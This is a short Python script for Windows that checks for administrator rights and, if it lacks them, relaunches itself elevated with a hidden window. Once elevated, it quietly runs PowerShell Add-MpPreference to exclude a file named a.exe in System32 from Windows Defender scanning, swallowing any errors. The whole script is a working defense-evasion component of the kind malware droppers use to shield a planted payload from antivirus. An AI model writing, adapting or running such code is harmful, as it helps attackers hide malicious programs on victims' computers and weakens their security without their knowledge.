import ctypes
import subprocess
import sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_defender_exclusion_for_file(file_path):
    # Ẩn cửa sổ PowerShell
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{file_path}\\""'
    try:
        subprocess.run(command, shell=True, check=True, startupinfo=startupinfo)
    except subprocess.CalledProcessError:
        pass

if __name__ == '__main__':
    file_to_exclude = r"C:\Windows\System32\a.exe"

    if is_admin():
        add_defender_exclusion_for_file(file_to_exclude)
    else:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 0)
